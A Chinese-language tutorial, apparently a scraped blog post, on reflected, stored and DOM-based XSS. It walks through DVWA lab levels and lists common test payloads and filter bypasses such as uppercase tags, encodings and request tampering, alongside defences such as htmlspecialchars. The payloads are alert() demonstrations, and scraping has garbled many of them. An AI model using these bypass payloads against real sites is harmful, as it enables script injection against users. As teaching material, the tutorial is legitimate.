<p>输出到页面的HTML代码变成了如下所示。可以看到，输入的双引号闭合了value属性的双引号，输入的&gt;闭合了input的标签&lt;，导致输入的<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onerror=alert(‘xss’)>变成了HTML标签。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps12.jpg" alt="img"> </p>
<p>浏览器渲染时，执行了<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onerror=alert(‘xss’)>,JS函数alert()导致浏览器弹窗。</p>
<p>(注:弹框实际上并不能造成什么危害，但这是我们用来测试xss漏洞点的一个方法。 </p>
<script>标签中可以执行javascript代码，所以理论上可以做任何事）

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onerrror=alert(‘xss’)>

在线短网址生成：http://aad.tw/

https://aad.tw/kp9c

#### **2.1.2反射型XSS代码分析**

在反射型XSS PHP代码中，通过GET获取参数xss_input_value的值，然后通过echo输出一个input标签，并将xss_input_value的值放入input标签的value中。当访问xss_input_value=“><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onerror=alert(‘xss’)>时，输出到页面的HTML代码变为<input type=”text“ value=” “><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onerror=alert(‘xss’)> ，此段HTML代码有两个标签，<input>标签和<img>标签，而<img>标签的作用就是让浏览器弹窗显示”xss”,代码如下：

 

![img](file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps13.jpg) 

### **2.2** **储存型****XSS**

***\*存储型XSS又称持久型XSS\****，***\*攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。\****

攻击方式：这种攻击多见于***\*论坛、博客和留言板\****，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意叫你本的帖子时，恶意脚本会在他们的浏览器中得到执行。

如下，恶意攻击者在留言板中加入以下代码：

<script>alert(“hello”)</script>

<p>当其他用户访问留言版时，就会看到一个弹窗。可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入一个页面中，所以访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入在一些我们信任的页面，因此无论我们多么小心，都难免会受到攻击。</p>
<h4 id="2-2-1-存储型XSS攻击举例"><a href="#2-2-1-存储型XSS攻击举例" class="headerlink" title="2.2.1 存储型XSS攻击举例"></a><strong>2.2.1 存储型XSS攻击举例</strong></h4><p>储存型XSS页面实现的功能是：获取用户输入的留言信息，标题和内容，然后将标题和内容插入到数据库中，并将数据库的留言信息输出到页面上。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps14.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps15.jpg" alt="img"> </p>
<p>当输入标题为<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onerror=alert(/xss/)>,然后将标题输出到页面时，页面执行了<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onerror=alert(/xss/)>,导致弹窗。此时，这里的XSS就是持久性的，也就是说，任何人访问该URL时都会导致一个显示XSS的框</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps16.jpg" alt="img"> </p>
<h4 id="2-2-2-存储型XSS攻击代码分析"><a href="#2-2-2-存储型XSS攻击代码分析" class="headerlink" title="2.2.2 存储型XSS攻击代码分析"></a><strong>2.2.2 存储型XSS攻击代码分析</strong></h4><p>在存储型xss的PHP代码中，获取POST参数title和参数content，然后将参数插入数据表中，接下来通过select查询将表XSS中的数据查询出来，并显示到页面上。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps17.jpg" alt="img"> </p>
<p>当用户在标题出写入<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onerror=alert(/xss/)>时，数据库中的数据如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps18.jpg" alt="img"> </p>
<p>当将title输出到页面时，页面执行了<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onerror=alert(/xss/)>,导致弹窗。</p>
<h3 id="2-3-DOM型XSS"><a href="#2-3-DOM型XSS" class="headerlink" title="2.3 DOM型XSS"></a><strong>2.3</strong> <strong>DOM型XSS</strong></h3><h4 id="2-3-1-DOM型XSS介绍"><a href="#2-3-1-DOM型XSS介绍" class="headerlink" title="2.3.1 DOM型XSS介绍"></a><strong>2.3.1</strong> <strong>DOM型XSS介绍</strong></h4><p>通过js代码操作前端的DOM节点（文档对象模型）时触发的XSS漏洞，一般不与后台服务器产生数据交互，属于中低危漏洞。</p>
<p>浏览器在解析html这种文档数据的时候，将文件数据当中的代码组织成一种文档型形式，这种文档就叫DOM文档。DOM全称Document Object Model，使用DOM可以使程序和脚本能够动态访问和更新文档的内容、结构及样式。</p>
<p>DOM型XSS是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。</p>
<p>HTML的标签都是节点，而这些节点组成了DOM的整体结构——节点树。通过HTML DOM，树中的所有结点均可通过JavaScript进行访问。所有****HTML元素(节点)均可被修改****，也可以创建或删除节点。HTML DOM树结构如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps19.jpg" alt="img"> </p>
<p>在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个项级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，****它只发生在客户端处理数据的阶段****。</p>
<h4 id="2-3-2-攻击方式"><a href="#2-3-2-攻击方式" class="headerlink" title="2.3.2 攻击方式"></a><strong>2.3.2 攻击方式</strong></h4><p>用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。</p>
<p>可能触发DOM型XSS的js操作如下：</p>
<p>document.referer</p>
<p>window . name属性</p>
<p>1ocation属性</p>
<p>innerHTML属性</p>
<p>documen.write属性</p>
<p>闭合标签：</p>
<p>‘ onclick&#x3D;”alert(‘xss’)”</p>
<p>‘ onclick&#x3D;”alert(‘xss’)”&gt;</p>
<p>‘&gt;<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="#" onmuouseover="alert('xss')"></p>
<h4 id="2-3-3-DOM型XSS攻击举例"><a href="#2-3-3-DOM型XSS攻击举例" class="headerlink" title="2.3.3 DOM型XSS攻击举例"></a><strong>2.3.3 DOM型XSS攻击举例</strong></h4><p>DOM型XSS攻击页面实现的功能是在”输入”框中输入信息，单击“替换”按钮时，页面会将”这里会显示输入的内容”替换为输入的信息,如输入aa，页面将“这里显示输入的内容”替换为aa。</p>
<p>测试地址: <a target="_blank" rel="noopener" href="http://127.0.0.1/web/XSS/xss3.php">http://127.0.0.1/web/XSS/xss3.php</a></p>
<p>当输入<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onerror=alert(/xss/)>时。单击替换，弹窗。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps20.jpg" alt="img"> </p>
<h4 id="2-3-4-DOM型XSS攻击代码分析"><a href="#2-3-4-DOM型XSS攻击代码分析" class="headerlink" title="2.3.4 DOM型XSS攻击代码分析"></a><strong>2.3.4</strong> <strong>DOM型XSS攻击代码分析</strong></h4><p>从HTML源码中可以看到，存在JS函数tihuan(),该函数作用是通过DOM操作将元素id1(输出位置)的内容修改为元素dom_input(输入位置)的内容。</p>
<p>DOM型XSS程序只有HTML代码，并不存在服务器段代码，所以此程序并没有与服务器进行交互。</p>
<p>单击“替换”按钮时会执行JavaScript的tihuan()函数，而tihuan()函数是一个DOM操作，通过document.getElementById获取ID为id1的节点，然后将节点id1的内容修改成id为dom_input中的值，即用户输入的值。当输入<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onerror=alert(‘xss’)>时，单击“替换”按钮，页面弹出消息框，但由于是隐式输出的，所以在查看源码时，看不到输出的XSS代码。<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps21.jpg" alt="img"></p>
<h2 id="三、-XSS常用的语句及绕过"><a href="#三、-XSS常用的语句及绕过" class="headerlink" title="三、****XSS常用的语句及绕过"></a><strong>三、****XSS常用的语句及绕过</strong></h2><h3 id="3-1-XSS常用的测试语句："><a href="#3-1-XSS常用的测试语句：" class="headerlink" title="3.1 XSS常用的测试语句："></a><strong>3.1</strong> <strong>XSS常用的测试语句：</strong></h3><script>alert(1)</script>

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=x onerror=alert(1)>

<svg onload=alert(1)>

<a href=javascript:alert(1)>

<p>onclick&#x3D;alert(1);</p>
<h3 id="3-2-常用的绕过"><a href="#3-2-常用的绕过" class="headerlink" title="3.2 常用的绕过"></a><strong>3.2</strong> <strong>常用的绕过</strong></h3><p>常见的XSS的绕过编码有JS编码、HTML实体编码和URL编码</p>
<h4 id="3-2-1-JS编码"><a href="#3-2-1-JS编码" class="headerlink" title="3.2.1 JS编码"></a><strong>3.2.1 JS编码</strong></h4><p>JS提供了四种字符编码的策略，如下所示：</p>
<p>三个八进制数字，如果个数不够，在前面补0，例如“e”的编码为“\145”。</p>
<p>两个十六进制数字，如果个数不够，在前面补0，例如“e”的编码为“\x65”。</p>
<p>四个十六进制数字，如果个数不够，在前面补0，例如“e”的编码为“\u0065”。</p>
<p>对于一些控制字符，使用特殊的C类型的转义风格(例如\n和\r)。</p>
<h4 id="3-2-2-HTML实体编码"><a href="#3-2-2-HTML实体编码" class="headerlink" title="3.2.2 HTML实体编码"></a><strong>3.2.2 HTML实体编码</strong></h4><p>命名实体：以&amp;开头，以分号结尾如 “&lt;”的编码是“&lt;”。  </p>
<p>字符编码：十进制、十六进制ASCII码或Unicode字符编码，样式为“&amp;#数值”。例如”&lt;”可以编码为“&lt;”和“&lt;”。</p>
<h4 id="3-2-3-URL编码"><a href="#3-2-3-URL编码" class="headerlink" title="3.2.3 URL编码"></a><strong>3.2.3 URL编码</strong></h4><p>这里的URL编码，也是两次URL全编码的结果，如果alert被过滤，结果为</p>
<p>%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</p>
<p>在使用XSS编码测试时，需要考虑HTML渲染的顺序，特别是针对多种编码组合时，要选择合适的编码方式进行测试。</p>
<h2 id="四、XSS之DVWA练习实战"><a href="#四、XSS之DVWA练习实战" class="headerlink" title="四、XSS之DVWA练习实战"></a>四、<strong>XSS之DVWA练习实战</strong></h2><h3 id="4-1-DVWA之Reflected-XSS-反射型XSS"><a href="#4-1-DVWA之Reflected-XSS-反射型XSS" class="headerlink" title="4.1 DVWA之Reflected XSS(反射型XSS)"></a><strong>4.1</strong> <strong>DVWA之Reflected XSS(反射型XSS)</strong></h3><h4 id="4-1-1-Low级别"><a href="#4-1-1-Low级别" class="headerlink" title="4.1.1 Low级别"></a><strong>4.1.1 Low级别</strong></h4><p>源代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps22.jpg" alt="img"> </p>
<p>可以看到，low级别的代码只是判断了name参数是否为空，如果不为空的话就直接打印出来，并没有对name参数做任何的过滤和检查，存在非常明显的XSS漏洞</p>
<p>我们输入 <script>alert('hack')</script>　直接就执行了我们的 js 代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps23.jpg" alt="img"> </p>
<p>查看源代码可以看到，我们的js代码已经被插入到页面中了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps24.jpg" alt="img"> </p>
<h4 id="4-1-2-Medium-级别"><a href="#4-1-2-Medium-级别" class="headerlink" title="4.1.2 Medium****级别"></a><strong>4.1.2</strong> <strong>Medium****级别</strong></h4><p>源代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps25.jpg" alt="img"> </p>
<pre> </pre> 元素可定义预格式化的文本。被包围在pre元素中的文本通常会保留空格和换行符。而文本也会呈现为等宽字体。 

<p>可以看到，medium级别的代码只是在low级别上增加了对于<scripit>的过滤，并没有什么用，我们可以直接大写绕过，我们输入 <SCRIPT>alert('hack')</SCRIPT> ，直接就执行了我们的js代码。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps26.jpg" alt="img"> </p>
<p>查看源代码，可以看到，我们的代码虽然输入的时候是大写(躲过了过滤)，但是最后输出的时候确是小写的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps27.jpg" alt="img"> </p>
<h4 id="4-1-3-High-级别"><a href="#4-1-3-High-级别" class="headerlink" title="4.1.3 High****级别"></a><strong>4.1.3</strong> <strong>High****级别</strong></h4><p>源代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps28.jpg" alt="img"> </p>
<p>可以看到，high级别的代码使用了正则表达式直接把 &lt;*s*c*r*i*p*t 给过滤了，* 代表一个或多个任意字符，i 代表不区分大小写。所以，我们的<script>标签在这里就不能用了。但是我们可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。</p>
<p>我们输入<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onerror=alert('hack')></p>
<p>上面输入的意思是，当图片显示错误时，然后执行 alert('hack') ，这里我们的src=1肯定显示错误啊，所以就执行alert语句。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps29.jpg" alt="img"> </p>
<h4 id="4-1-3-impossible级别"><a href="#4-1-3-impossible级别" class="headerlink" title="4.1.3 impossible级别"></a><strong>4.1.3 impossible级别</strong></h4><p>源代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps30.jpg" alt="img"> </p>
<p>htmlspecialchars(string)： 把预定义的字符 "<" （小于）、 ">" （大于）、& 、‘’、“” 转换为 HTML 实体，防止浏览器将其作为HTML元素</p>
<p>可以看出，impossible级别的代码先判断name是否为空，不为空的话然后验证其token，来防范CSRF攻击。然后再用htmlspecialchars函数将name中的预定义字符转换成html实体，这样就防止了我们填入标签</p>
<p>当我们输入 <script>alert('hack')</script> 时，因为 htmlspecialchars 函数会将 &lt; 和 &gt; 转换成html实体,并且${name}取的是$name的值，然后包围在<pre></pre>标签中被打印出来，所以我们插入的语句并不会被执行。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps31.jpg" alt="img"> </p>
<p>我们可以查看源代码，表单提交的过程中，把我们的user_token也一并提交了，来和服务器端的session_token做验证，防止CSRF攻击。我们输入的代码，直接被当成html文本给打印出来了，并不会被当成js脚本执行。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps32.jpg" alt="img"> </p>
<h3 id="4-2-DVWA之Stored-XSS-存储型XSS"><a href="#4-2-DVWA之Stored-XSS-存储型XSS" class="headerlink" title="4.2 DVWA之Stored XSS(存储型XSS)"></a><strong>4.2</strong> <strong>DVWA之Stored XSS(存储型XSS)</strong></h3><h4 id="4-2-1-Low级别"><a href="#4-2-1-Low级别" class="headerlink" title="4.2.1 Low级别"></a><strong>4.2.1 Low级别</strong></h4><p>源代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps33.jpg" alt="img"> </p>
<p>trim(string,charlist) ： 移除string字符两侧的预定义字符，预定义字符包括\t 、 \n 、\x0B 、\r以及空格，可选参数charlist支持添加额外需要删除的字符</p>
<p>stripslashes(string)： 去除掉string字符的反斜杠＼</p>
<p>mysqli_real_escape_string(string,connection) ：函数会对字符串string中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</p>
<p>$GLOBALS ：引用全局作用域中可用的全部变量。$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。</p>
<p>可以看出，low级别的代码对我们输入的message和name并没有进行XSS过滤，而且数据存储在数据库中，存在比较明显的存储型XSS漏洞</p>
<p>我们输入 aa 和 <script>alert('hack')</script> ，可以看到，我们的js代码立即就执行了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps34.jpg" alt="img"> </p>
<p>查看数据库，我们的代码被插入到了数据库进行存储。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps35.jpg" alt="img"> </p>
<p>查看源代码，可以看到，Message位置显示的是我们的js代码，因为这里显示的数据是调用数据库里的数据</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps36.jpg" alt="img"> </p>
<h4 id="4-2-2-Medium-级别"><a href="#4-2-2-Medium-级别" class="headerlink" title="4.2.2 Medium****级别"></a><strong>4.2.2</strong> <strong>Medium****级别</strong></h4><p>源代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps37.jpg" alt="img"> </p>
<p>addslashes(string) ：函数返回在预定义字符之前添加反斜杠的字符串，预定义字符 ‘ 、” 、\ 、NULL</p>
<p>strip_tags(string) ：函数剥去string字符串中的 HTML、XML 以及 PHP 的标签</p>
<p>htmlspecialchars(string)： 把预定义的字符 “&lt;” （小于）、 “&gt;” （大于）、&amp; 、‘’、“” 转换为 HTML 实体，防止浏览器将其作为HTML元素</p>
<p>当我们再次输入1 和 <script>alert('hack')</script> ，strip_tags函数把<script>标签给剥除了，addslashes函数把 ' 转义成了 &#39;</p>
<p>!<a href="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps38.jpg">img</a></p>
<p>虽然 Message 参数把所有的XSS都给过滤了，但是name参数只是过滤了<script>标签而已，我们依然可以在name参数进行注入,可是发现name参数对长度有限制，最大长度是10。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps39.jpg" alt="img"> </p>
<p>所以我们想到了抓包，然后进行篡改，我们输入如下的，然后抓包</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps40.jpg" alt="img"> </p>
<p>如下框中的数据就是 <script>al 经过URL编码后的数据</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps41.jpg" alt="img"> </p>
<p>我们需要将其修改为 <SCRIPT>alert('hack')</SCRIPT> 经过URL编码后的数据</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps42.jpg" alt="img"> </p>
<p>提交后，就可以看到弹出此框了，说明我们的js代码执行了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps43.jpg" alt="img"> </p>
<p>查看数据库，可以看到我们的代码插入进数据库了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps44.jpg" alt="img"> </p>
<p>查看页面源代码，可以看到name位置插入了我们的js代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps45.jpg" alt="img"> </p>
<h4 id="4-2-3-High-级别"><a href="#4-2-3-High-级别" class="headerlink" title="4.2.3 High****级别"></a><strong>4.2.3</strong> <strong>High****级别</strong></h4><p>源代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps46.jpg" alt="img"> </p>
<p>可以看到，high级别只是在medium级别上，name参数用了正则表达式进行过滤而已，我们仍然可以在name参数做手脚，抓包，然后改包，只不过这次改成 &lt;img src&#x3D;1  onerror&#x3D;alert(‘hack’)&gt;</p>
<p>我们输入如下的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps47.jpg" alt="img"> </p>
<p>然后将&lt;img src&#x3D;1  onerror&#x3D;alert(‘hack’)&gt; 进行URL编码</p>
